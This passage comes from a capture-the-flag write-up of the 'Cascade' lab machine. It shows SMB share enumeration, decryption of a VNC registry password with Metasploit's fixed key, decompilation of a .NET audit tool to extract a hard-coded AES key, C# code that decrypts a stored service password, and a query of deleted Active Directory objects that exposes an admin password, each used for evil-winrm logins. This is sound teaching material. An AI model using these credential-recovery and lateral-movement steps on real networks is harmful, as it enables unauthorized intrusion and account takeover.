        dr--r--r--                0 Sun Jan 12 20:45:14 2020    Contractors
        dr--r--r--                0 Sun Jan 12 20:45:10 2020    Finance
        dr--r--r--                0 Tue Jan 28 13:04:51 2020    IT
        dr--r--r--                0 Sun Jan 12 20:45:20 2020    Production
        dr--r--r--                0 Sun Jan 12 20:45:16 2020    Temps
        Data                                                    READ ONLY
        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
        <span class="nb">.</span>                                                  
        dr--r--r--                0 Wed Jan 15 16:50:33 2020    <span class="nb">.</span>
        dr--r--r--                0 Wed Jan 15 16:50:33 2020    ..
        fr--r--r--              258 Wed Jan 15 16:50:14 2020    MapAuditDrive.vbs
        fr--r--r--              255 Wed Jan 15 16:51:03 2020    MapDataDrive.vbs
        NETLOGON                                                READ ONLY       Logon server share 
        <span class="nb">.</span>                                                  
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    <span class="nb">.</span>
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    ..
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    color
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    IA64
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    W32X86
        dr--r--r--                0 Sun Jan 12 22:09:11 2020    x64
        print<span class="nv">$ </span>                                                 READ ONLY       Printer Drivers
        <span class="nb">.</span>                                                  
        dr--r--r--                0 Thu Jan  9 10:31:27 2020    <span class="nb">.</span>
        dr--r--r--                0 Thu Jan  9 10:31:27 2020    ..
        dr--r--r--                0 Thu Jan  9 10:31:27 2020    cascade.local
        SYSVOL                                                  READ ONLY       Logon server share 
</pre></table></code></div></div><p>As <code class="language-plaintext highlighter-rouge">r.thompson</code>, we are only able to read from <code class="language-plaintext highlighter-rouge">Data</code>, <code class="language-plaintext highlighter-rouge">NETLOGON</code>, <code class="language-plaintext highlighter-rouge">print$</code> and <code class="language-plaintext highlighter-rouge">SYSVOL</code>. Time to start digging around!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient //cascade.local/Data <span class="nt">-U</span> r.thompson
Enter WORKGROUP<span class="se">\r</span>.thompson<span class="s1">'s password: 
Try "help" to get a list of possible commands.
...
smb: \IT\Temp\s.smith\&gt; dir
  .                                   D        0  Tue Jan 28 15:00:01 2020
  ..                                  D        0  Tue Jan 28 15:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020

                13106687 blocks of size 4096. 7792770 blocks available
smb: \IT\Temp\s.smith\&gt; get "VNC Install.reg"
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)               
</span></pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">\IT\Temp\s.smith\</code> was a file called <code class="language-plaintext highlighter-rouge">VNC Install.reg</code>. After downloading and reading it, we see something interesting.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> <span class="s2">"VNC Install.reg"</span>
...
<span class="s2">"Password"</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
</pre></table></code></div></div><p>This password can be decoded by using <code class="language-plaintext highlighter-rouge">msfconsole</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole
msf5 <span class="o">&gt;</span> irb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting IRB shell...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> You are <span class="k">in </span>the <span class="s2">"framework"</span> object
<span class="o">&gt;&gt;</span> fixedkey <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">07"</span>
<span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\u</span><span class="s2">0017Rk</span><span class="se">\u</span><span class="s2">0006#NX</span><span class="se">\a</span><span class="s2">"</span>
<span class="o">&gt;&gt;</span> require <span class="s1">'rex/proto/rfb'</span>
<span class="o">=&gt;</span> <span class="nb">true</span>
<span class="o">&gt;&gt;</span> Rex::Proto::RFB::Cipher.decrypt <span class="o">[</span><span class="s2">"6BCF2A4B6E5ACA0F"</span><span class="o">]</span>.pack<span class="o">(</span><span class="s1">'H*'</span><span class="o">)</span>, fixedkey
<span class="o">=&gt;</span> <span class="s2">"sT333ve2"</span>
</pre></table></code></div></div><p>Since the file was found in a directory belonging <code class="language-plaintext highlighter-rouge">s.smith</code>, we assume that this is his password. Lets test it out.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbmap <span class="nt">-H</span> cascade.local <span class="nt">-d</span> cascade.local <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2
<span class="o">[</span>+] Finding open SMB ports....
<span class="o">[</span>+] User SMB session established on cascade.local...
<span class="o">[</span>+] IP: cascade.local:445       Name: unknown                                           
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
        <span class="nb">.</span>                                                  
        dr--r--r--                0 Wed Jan 29 13:01:26 2020    <span class="nb">.</span>
        dr--r--r--                0 Wed Jan 29 13:01:26 2020    ..
        fr--r--r--            13312 Tue Jan 28 16:47:08 2020    CascAudit.exe
        fr--r--r--            12288 Wed Jan 29 13:01:26 2020    CascCrypto.dll
        dr--r--r--                0 Tue Jan 28 16:43:18 2020    DB
        fr--r--r--               45 Tue Jan 28 18:29:47 2020    RunAudit.bat
        fr--r--r--           363520 Tue Jan 28 15:42:18 2020    System.Data.SQLite.dll
        fr--r--r--           186880 Tue Jan 28 15:42:18 2020    System.Data.SQLite.EF6.dll
        dr--r--r--                0 Tue Jan 28 15:42:18 2020    x64
        dr--r--r--                0 Tue Jan 28 15:42:18 2020    x86
        Audit<span class="nv">$ </span>                                                 READ ONLY
...
</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">s.smith</code>, we now have access to an additional share <code class="language-plaintext highlighter-rouge">Audit$</code>. Wait, we haven’t found <code class="language-plaintext highlighter-rouge">user.txt</code>?</p><h1 id="usertxt">user.txt</h1><p>Running a second <code class="language-plaintext highlighter-rouge">nmap</code> scan but with all ports reveals an additional service we can use: <code class="language-plaintext highlighter-rouge">winrm</code> on port <code class="language-plaintext highlighter-rouge">5985</code>. Using <a href="https://github.com/Hackplayers/evil-winrm"><code class="language-plaintext highlighter-rouge">evil-winrm</code></a>,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby evil-winrm.rb <span class="nt">-i</span> cascade.local <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
003fXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>Back to the <code class="language-plaintext highlighter-rouge">Audit$</code> share, there were quite a few interesting files. After downloading all the files, I first checked out <code class="language-plaintext highlighter-rouge">\DB\Audit.db</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file Audit.db 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002
</pre></table></code></div></div><p>Fortunately, Kali Linux comes pre-installed with a SQLite Database browser.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cascade1.png" alt="" /></p><p>After loading <code class="language-plaintext highlighter-rouge">Audit.db</code> into the browser, you should see 4 tables.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cascade2.png" alt="" /></p><p>There were mainly 2 interesting tables:</p><p><code class="language-plaintext highlighter-rouge">DeletedUserAudit</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cascade3.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">Ldap</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cascade4.png" alt="" /></p><p>It seems like we found a username <code class="language-plaintext highlighter-rouge">ArkSvc</code> and its password which appears to be in base64. However, decoding it doesn’t return any readable password. :(</p><p>The next file I checked was <code class="language-plaintext highlighter-rouge">RunAudit.bat</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>RunAudit.bat
CascAudit.exe <span class="s2">"</span><span class="se">\\</span><span class="s2">CASC-DC1</span><span class="se">\A</span><span class="s2">udit</span><span class="nv">$\</span><span class="s2">DB</span><span class="se">\A</span><span class="s2">udit.db"</span>
</pre></table></code></div></div><p>Hmm… This batch script is runnig <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and using <code class="language-plaintext highlighter-rouge">Audit.db</code> as a command line argument. Perhaps it is writing/reading from it? Lets check out <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> next.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file CascAudit.exe 
CascAudit.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel 80386 Mono/.Net assembly, <span class="k">for </span>MS Windows
</pre></table></code></div></div><p>Fortunately, it was written in <code class="language-plaintext highlighter-rouge">.NET</code>, meaning we can decompile it to obtain its original source code! I will be transferring <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> to my FlareVM, which has <code class="language-plaintext highlighter-rouge">ILSpy</code> installed.</p><p><code class="language-plaintext highlighter-rouge">CascAudit.exe</code>:</p><div class="language-csharp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="n">sQLiteConnection</span><span class="p">.</span><span class="nf">Open</span><span class="p">();</span>
<span class="n">SQLiteCommand</span> <span class="n">sQLiteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SQLiteCommand</span><span class="p">(</span><span class="s">"SELECT * FROM LDAP"</span><span class="p">,</span> <span class="n">sQLiteConnection</span><span class="p">);</span>
<span class="k">try</span>
<span class="p">{</span>
        <span class="n">SQLiteDataReader</span> <span class="n">sQLiteDataReader</span> <span class="p">=</span> <span class="n">sQLiteCommand</span><span class="p">.</span><span class="nf">ExecuteReader</span><span class="p">();</span>
        <span class="k">try</span>
        <span class="p">{</span>
                <span class="n">sQLiteDataReader</span><span class="p">.</span><span class="nf">Read</span><span class="p">();</span>
                <span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="n">sQLiteDataReader</span><span class="p">[</span><span class="s">"Uname"</span><span class="p">]);</span>
                <span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="n">sQLiteDataReader</span><span class="p">[</span><span class="s">"Domain"</span><span class="p">]);</span>
                <span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="nf">ToString</span><span class="p">(</span><span class="n">sQLiteDataReader</span><span class="p">[</span><span class="s">"Pwd"</span><span class="p">]);</span>
                <span class="k">try</span>
                <span class="p">{</span>
                        <span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="nf">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">"c4scadek3y654321"</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
                <span class="p">{</span>
                        <span class="n">ProjectData</span><span class="p">.</span><span class="nf">SetProjectError</span><span class="p">(</span><span class="n">ex</span><span class="p">);</span>
                        <span class="n">Exception</span> <span class="n">ex2</span> <span class="p">=</span> <span class="n">ex</span><span class="p">;</span>
                        <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Error decrypting password: "</span> <span class="p">+</span> <span class="n">ex2</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
                        <span class="n">ProjectData</span><span class="p">.</span><span class="nf">ClearProjectError</span><span class="p">();</span>
                        <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
<span class="p">...</span>
</pre></table></code></div></div><p>In this code segment, it is attempting to select records from the <code class="language-plaintext highlighter-rouge">LDAP</code> table and decrypt the encrypted string in the “Pwd” column with a hard-coded key <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code>. The decrypt function used was from a custom class called <code class="language-plaintext highlighter-rouge">Crypto</code>, which was in another file in the <code class="language-plaintext highlighter-rouge">Audit$</code> share called <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code>. Opening it up with <code class="language-plaintext highlighter-rouge">ILSpy</code>,</p><p><code class="language-plaintext highlighter-rouge">CascCrypto.dll</code>:</p><div class="language-csharp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">class</span> <span class="nc">Crypto</span>
<span class="p">{</span>
	<span class="k">public</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">DefaultIV</span> <span class="p">=</span> <span class="s">"1tdyjCbY1Ix49842"</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">Keysize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>

	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">EncryptString</span><span class="p">(</span><span class="kt">string</span> <span class="n">Plaintext</span><span class="p">,</span> <span class="kt">string</span> <span class="n">Key</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">Plaintext</span><span class="p">);</span>
		<span class="n">Aes</span> <span class="n">aes</span> <span class="p">=</span> <span class="n">Aes</span><span class="p">.</span><span class="nf">Create</span><span class="p">();</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"1tdyjCbY1Ix49842"</span><span class="p">);</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
		<span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">())</span>
		<span class="p">{</span>
			<span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">aes</span><span class="p">.</span><span class="nf">CreateEncryptor</span><span class="p">(),</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">))</span>
			<span class="p">{</span>
				<span class="n">cryptoStream</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
				<span class="n">cryptoStream</span><span class="p">.</span><span class="nf">FlushFinalBlock</span><span class="p">();</span>
			<span class="p">}</span>
			<span class="k">return</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">ToBase64String</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">());</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="kt">string</span> <span class="n">EncryptedString</span><span class="p">,</span> <span class="kt">string</span> <span class="n">Key</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="c1">//Discarded unreachable code: IL_009e</span>
		<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">);</span>
		<span class="n">Aes</span> <span class="n">aes</span> <span class="p">=</span> <span class="n">Aes</span><span class="p">.</span><span class="nf">Create</span><span class="p">();</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"1tdyjCbY1Ix49842"</span><span class="p">);</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
		<span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">(</span><span class="n">array</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CryptoStream</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">aes</span><span class="p">.</span><span class="nf">CreateDecryptor</span><span class="p">(),</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">))</span>
			<span class="p">{</span>
				<span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="k">checked</span><span class="p">(</span><span class="n">array</span><span class="p">.</span><span class="n">Length</span> <span class="p">-</span> <span class="m">1</span> <span class="p">+</span> <span class="m">1</span><span class="p">)];</span>
				<span class="n">cryptoStream</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
				<span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array2</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>To decrypt the encrypted password in the <code class="language-plaintext highlighter-rouge">Audit.db</code>, we can simply just make use of the <code class="language-plaintext highlighter-rouge">DecryptString</code> method that was already implemented for us. I am not well-versed on how to setup an environment for <code class="language-plaintext highlighter-rouge">.NET</code> but I know there are websites like <a href="https://dotnetfiddle.net/">this</a> that allows you run any <code class="language-plaintext highlighter-rouge">.NET</code> code ! :)</p><p>This is how my final code looks like:</p><div class="language-csharp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Security.Cryptography</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
					
<span class="k">public</span> <span class="k">class</span> <span class="nc">Program</span>
<span class="p">{</span>	
	<span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="kt">string</span> <span class="n">EncryptedString</span><span class="p">,</span> <span class="kt">string</span> <span class="n">Key</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="c1">//Discarded unreachable code: IL_009e</span>
		<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">);</span>
		<span class="n">Aes</span> <span class="n">aes</span> <span class="p">=</span> <span class="n">Aes</span><span class="p">.</span><span class="nf">Create</span><span class="p">();</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="m">128</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"1tdyjCbY1Ix49842"</span><span class="p">);</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
		<span class="n">aes</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
		<span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">(</span><span class="n">array</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CryptoStream</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">aes</span><span class="p">.</span><span class="nf">CreateDecryptor</span><span class="p">(),</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">))</span>
			<span class="p">{</span>
				<span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="k">checked</span><span class="p">(</span><span class="n">array</span><span class="p">.</span><span class="n">Length</span> <span class="p">-</span> <span class="m">1</span> <span class="p">+</span> <span class="m">1</span><span class="p">)];</span>
				<span class="n">cryptoStream</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
				<span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array2</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="nf">DecryptString</span><span class="p">(</span><span class="s">"BQO5l5Kj9MdErXx6Q6AGOw=="</span><span class="p">,</span> <span class="s">"c4scadek3y654321"</span><span class="p">));</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>After executing, we get the output <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code>.</p><p>Using <a href="https://github.com/Hackplayers/evil-winrm"><code class="language-plaintext highlighter-rouge">evil-winrm</code></a> again, we establish a shell as <code class="language-plaintext highlighter-rouge">ArkSvc</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby evil-winrm.rb <span class="nt">-i</span> cascade.local <span class="nt">-u</span> ArkSvc <span class="nt">-p</span> w3lc0meFr31nd

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; 
</pre></table></code></div></div><p>Going back to the <code class="language-plaintext highlighter-rouge">Data</code> share, there was a file <code class="language-plaintext highlighter-rouge">Meeting_Notes_June_2018.html</code> in <code class="language-plaintext highlighter-rouge">\IT\Email Archives\</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>...
&lt;p&gt;-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). &lt;/p&gt;
...
</pre></table></code></div></div><p>Hmm… If we can somehow recover <code class="language-plaintext highlighter-rouge">TempAdmin</code>, we might be able to get the password of the <code class="language-plaintext highlighter-rouge">Administrator</code> account!</p><p>Lets see if we can retrieve information about deleted objects!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -properties *
...
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
...
</pre></table></code></div></div><p>Like <code class="language-plaintext highlighter-rouge">r.thompson</code>, <code class="language-plaintext highlighter-rouge">TempAdmin</code> had a <code class="language-plaintext highlighter-rouge">cascadeLegacyPwd</code>, which is <code class="language-plaintext highlighter-rouge">baCT3r1aN00dles</code> when decoded!</p><h1 id="roottxt">root.txt</h1><p>Using <a href="https://github.com/Hackplayers/evil-winrm"><code class="language-plaintext highlighter-rouge">evil-winrm</code></a> for the final time, we finally get our flag!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby evil-winrm.rb <span class="nt">-i</span> cascade.local <span class="nt">-u</span> Administrator <span class="nt">-p</span> baCT3r1aN00dles
